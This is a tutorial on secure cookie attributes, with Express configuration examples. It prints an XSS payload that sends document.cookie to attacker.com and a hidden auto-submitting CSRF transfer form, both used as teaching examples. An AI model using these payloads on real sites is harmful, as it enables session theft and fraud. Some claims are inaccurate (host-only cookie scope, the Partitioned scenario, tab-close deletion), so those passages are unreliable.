# Secure Cookie Attributes

## Definition

A cookie is a small piece of data stored on the client that is sent to the server with every request to that domain. Cookies can store authentication tokens, session IDs, user preferences, and other data. However, improper cookie configuration creates security vulnerabilities including XSS attacks, CSRF attacks, and session hijacking.

Cookie security depends on properly setting attributes like HttpOnly, Secure, SameSite, Domain, Path, Expires/Max-Age, and Partitioned.

## All Cookie Attributes Explained

### HttpOnly Attribute

**Purpose**: Prevents JavaScript from accessing the cookie via `document.cookie`

```
Set-Cookie: sessionid=abc123; HttpOnly
```

**What it does:**

```javascript
// WITHOUT HttpOnly:
console.log(document.cookie); // "sessionid=abc123" (visible!)

// WITH HttpOnly:
console.log(document.cookie); // "" (cookie not accessible)
```

**Protection:**
- Prevents XSS attacks from stealing session cookies
- Even if attacker injects JavaScript, they cannot access the cookie

**When to use:**
- All authentication cookies (session ID, JWT, etc.)
- Sensitive data that should only be sent to server

**When NOT to use:**
- Cookies that need to be accessible to JavaScript (rare)

### Secure Attribute

**Purpose**: Cookie only sent over HTTPS connections, not HTTP

```
Set-Cookie: sessionid=abc123; Secure
```

**What it does:**

```
User visits: http://bank.example.com
Response: Set-Cookie: sessionid=abc123; Secure

On subsequent request to: http://bank.example.com
Browser DOES NOT send the cookie (HTTP, not HTTPS)

On subsequent request to: https://bank.example.com
Browser DOES send the cookie (HTTPS)
```

**Protection:**
- Prevents cookies from being transmitted in plaintext
- Network eavesdroppers cannot intercept the cookie
- Prevents SSL stripping attacks (combined with HSTS)

**When to use:**
- All cookies on production sites using HTTPS
- Authentication cookies especially

**When NOT to use:**
- Local testing on http://localhost (may need to disable for development)

### SameSite Attribute

**Purpose**: Prevents CSRF attacks by restricting cross-site cookie sending

```
Set-Cookie: sessionid=abc123; SameSite=Strict
```

Three values:

#### SameSite=Strict

Cookie is ONLY sent for same-site requests:

```
User on attacker.com (logged into bank.example.com):

<img src="https://bank.example.com/transfer?amount=1000&to=attacker">
Cookie is NOT sent (cross-site)
Request fails, user is protected
```

```javascript
// Same-site request (from bank.example.com to bank.example.com)
fetch('https://bank.example.com/api/transfer')
// ✓ Cookie sent

// Cross-site request (from attacker.com to bank.example.com)
fetch('https://bank.example.com/api/transfer')
// ✗ Cookie NOT sent
```

**Trade-off**: Top-level navigation is also blocked
```javascript
// User clicks link on attacker.com to bank.example.com
<a href="https://bank.example.com">Visit Bank</a>
// Cookie not sent, user not logged in on arrival
// User must log in again
```

#### SameSite=Lax (Recommended)

Cookie sent for same-site requests AND top-level navigation:

```javascript
// Same-site request
fetch('https://bank.example.com/api/transfer')
// ✓ Cookie sent

// Cross-site request (form submission, img src, etc.)
<form action="https://bank.example.com/transfer">
// ✗ Cookie NOT sent

// But: Top-level navigation IS allowed
<a href="https://bank.example.com">
// ✓ Cookie sent (so user is logged in when arriving)
```

Better balance of security and usability. **Best for most applications.**

#### SameSite=None

Cookie sent for all cross-site requests:

```
Set-Cookie: sessionid=abc123; SameSite=None; Secure
```

**Note**: SameSite=None requires Secure flag (HTTPS only)

Used when you NEED cookies in cross-site requests:
- Third-party embeds (analytics, ads, etc.)
- VERY risky for authentication cookies

### Domain Attribute

**Purpose**: Restricts which domains the cookie is sent to

```
Set-Cookie: sessionid=abc123; Domain=bank.example.com
```

**What it does:**

```
Set-Cookie: sessionid=abc123; Domain=bank.example.com

Sent to:
- bank.example.com ✓
- www.bank.example.com ✓
- api.bank.example.com ✓
- test.bank.example.com ✓

NOT sent to:
- evil.example.com ✗
- example.com ✗
- otherbank.com ✗
```

**Without Domain attribute:**
```
Set-Cookie: sessionid=abc123

Sent only to:
- Exact domain that set the cookie
- Subdomains of that domain
```

**Security implications:**

```
// DANGEROUS: Too broad domain
Set-Cookie: sessionid=abc123; Domain=.example.com
// Cookie sent to all subdomains

// If attacker owns a subdomain (attacker.example.com)
// They can steal the cookie

// SECURE: Specific domain
Set-Cookie: sessionid=abc123; Domain=bank.example.com
// Only bank.example.com and subdomains you control
```

### Path Attribute

**Purpose**: Restricts which paths the cookie is sent to

```
Set-Cookie: sessionid=abc123; Path=/api
```

**What it does:**

```
Set-Cookie: sessionid=abc123; Path=/api

Sent to:
- /api ✓
- /api/users ✓
- /api/users/123 ✓

NOT sent to:
- / ✗
- /admin ✗
- /public ✗
```

**Use case:** Different sessions for different paths

```
Set-Cookie: sessionid=abc123; Path=/api
Set-Cookie: admin_session=def456; Path=/admin

GET /api/users
// Includes: sessionid=abc123

GET /admin/settings
// Includes: admin_session=def456
```

### Expires / Max-Age

**Purpose**: Set when the cookie expires

#### Expires (older)

```
Set-Cookie: sessionid=abc123; Expires=Wed, 09 Jun 2026 10:18:14 GMT
```

Absolute date/time. Cookie deleted after this date.

#### Max-Age (newer, preferred)

```
Set-Cookie: sessionid=abc123; Max-Age=3600
```

Relative duration in seconds. Cookie deleted N seconds after creation.

```
Max-Age=3600        # 1 hour
Max-Age=86400       # 1 day
Max-Age=604800      # 1 week
Max-Age=2592000     # 30 days
Max-Age=31536000    # 1 year
```

**Security implications:**

```
Short Max-Age (1 hour):
- Attacker's time window to use stolen cookie is limited
- More secure
- More annoying for users (must log in frequently)

Long Max-Age (1 year):
- Convenient for users
- But stolen cookie is valid for much longer
- Higher risk

Recommendation: 24 hours for sensitive operations, 30 days for low-risk
```

**Note:** Omitting both means "session cookie" - deleted when browser closes

```
Set-Cookie: sessionid=abc123
// Deleted when browser tab closes
```

### Partitioned Attribute (Chrome 131+)

**Purpose**: Isolates cookies by top-level site for third-party cookies

```
Set-Cookie: analytics=track123; Partitioned
```

**Problem it solves:**

```
Without Partitioned:
- You're logged into bank.example.com
- You visit attacker.com
- attacker.com loads <img src="https://ads.example.com/track">
- ads.example.com can see your bank.example.com session cookie
- Third-party tracker can correlate your behavior across sites

With Partitioned:
- Cookies are isolated by top-level site
- Ads served on bank.example.com get one partition
- Ads served on attacker.com get a different partition
- No cross-site tracking
```

**Use case:** Third-party cookies that must work across sites

```
Set-Cookie: analytics=track123; Partitioned; Domain=example.com
// Effective only within the context of each top-level domain
```

**Note:** Replaces third-party cookies phase-out

## What Each Attribute Protects Against

```
HttpOnly
├─ Protects against: XSS cookie theft
└─ Prevents JavaScript from accessing cookie

Secure
├─ Protects against: Network eavesdropping, SSL stripping
└─ HTTPS only, unencrypted HTTP requests don't send cookie

SameSite=Strict/Lax
├─ Protects against: CSRF attacks
└─ Cross-site requests don't send cookie

Domain
├─ Protects against: Cookie leakage to other domains
└─ Restricts which domains receive the cookie

Path
├─ Protects against: Cookie leakage to different paths
└─ Restricts which paths receive the cookie

Expires/Max-Age
├─ Protects against: Long-term exploitation of stolen cookies
└─ Cookies automatically expire

Partitioned
├─ Protects against: Third-party cross-site tracking
└─ Isolates cookies by top-level site
```

## Cookie Theft via XSS Scenario

### Vulnerable Application

```html
<!-- Page has XSS vulnerability -->
<h1>Welcome, <span id="username"></span></h1>

<script>
  // XSS Vulnerability: No sanitization
  const params = new URLSearchParams(location.search);
  document.getElementById('username').innerHTML = params.get('name');
</script>

<!-- Cookie without HttpOnly -->
<script>
  // Setcookie in response lacks HttpOnly
  // Set-Cookie: sessionid=abc123
</script>
```

**Attack:**

```
1. Attacker crafts malicious URL:
   https://site.com?name=<img src=x onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">

2. Victim clicks link
3. XSS payload executes: fetch('http://attacker.com/steal?cookie=sessionid=abc123')
4. Attacker receives session cookie
5. Attacker uses cookie to impersonate victim
```

### Secure Application

```javascript
// Set secure cookie
res.cookie('sessionid', sessionToken, {
  httpOnly: true,     // JavaScript cannot access
  secure: true,       // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 86400000    // 1 day
});

// Page still has XSS, but cookie is protected
<!-- Attacker injects: <img src=x onerror="alert(document.cookie)"> -->

// Result:
// alert(document.cookie) shows empty string
// Cookie is not stolen
```

## CSRF via Missing SameSite

### Vulnerable Scenario

```
User is logged into bank.example.com (cookie set without SameSite)
User visits attacker.com (while still logged in)

Page loads hidden attack:
<form method="POST" action="https://bank.example.com/transfer" style="display:none">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker@evil.com">
</form>
<script>document.querySelector('form').submit();</script>

Browser automatically includes cookie in cross-site request:
POST https://bank.example.com/transfer
Cookie: sessionid=abc123

Bank processes request (attacker is authenticated with stolen session)
Money transferred to attacker
```

### Protected with SameSite

```
Set-Cookie: sessionid=abc123; SameSite=Lax

Form submission from attacker.com:
POST https://bank.example.com/transfer
// Browser DOES NOT include cookie (cross-site, not top-level navigation)

Request is unauthenticated
Bank rejects it
Attack fails
```

## Setting Cookies Correctly in Express

### Vulnerable Code

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

// VULNERABLE: Insecure cookie configuration
app.use(session({
  secret: 'my-secret',
  resave: false,
  saveUninitialized: true,
  cookie: {
    // MISSING httpOnly
    // MISSING secure
    // MISSING sameSite
    maxAge: 1000 * 60 * 60 * 24
  }
}));
```

### Secure Code

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const app = express();

// Create Redis client
const redisClient = createClient();

// SECURE: Proper cookie configuration
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  name: 'sessionid', // Don't use default "connect.sid"
  cookie: {
    httpOnly: true,           // No JavaScript access
    secure: true,             // HTTPS only
    sameSite: 'lax',         // CSRF protection
    maxAge: 1000 * 60 * 60 * 24, // 24 hours
    domain: 'example.com',   // Specific domain
    path: '/'                 // Root path
  }
}));

// Alternative: Set cookie directly
app.post('/login', (req, res) => {
  const sessionToken = generateToken();

  res.cookie('sessionid', sessionToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 86400000, // 24 hours in milliseconds
    domain: 'example.com',
    path: '/',
    signed: true // Optionally sign the cookie
  });

  res.json({ message: 'Logged in' });
});

app.listen(3000);
```

## Best Practices

1. **Always set HttpOnly**: Prevents JavaScript from accessing authentication cookies
2. **Always set Secure**: Ensures HTTPS-only transmission
3. **Always set SameSite**: Use Lax by default, Strict for sensitive operations
4. **Set specific Domain**: Don't allow overly broad domains
5. **Set appropriate Max-Age**: Balance security with user convenience
6. **Use Lax for general cookies**: Allows top-level navigation but prevents CSRF
7. **Use Strict for sensitive operations**: Payment, password change, etc.
8. **Use None only when necessary**: And always with Secure flag
9. **Never send sensitive data in cookies**: Use secure token storage
10. **Validate cookies server-side**: Don't trust all cookies without verification
11. **Clear cookies on logout**: Remove authentication cookies completely
12. **Set SameSite=None for third-party cookies**: With Partitioned attribute
13. **Monitor cookie usage**: Log cookie access for security audits
14. **Use secure cookie libraries**: Don't implement cookie logic manually
15. **Test cookie behavior**: Verify secure attributes are set correctly
16. **Document cookie usage**: Team should know which cookies serve what purpose
17. **Refresh cookies periodically**: Reduce impact of long-lived stolen cookies
18. **Use different cookies for different purposes**: Session vs. preferences vs. tracking
19. **Consider path restrictions**: If you have multiple applications on subpaths
20. **Plan for third-party cookie deprecation**: Start using Partitioned attribute now
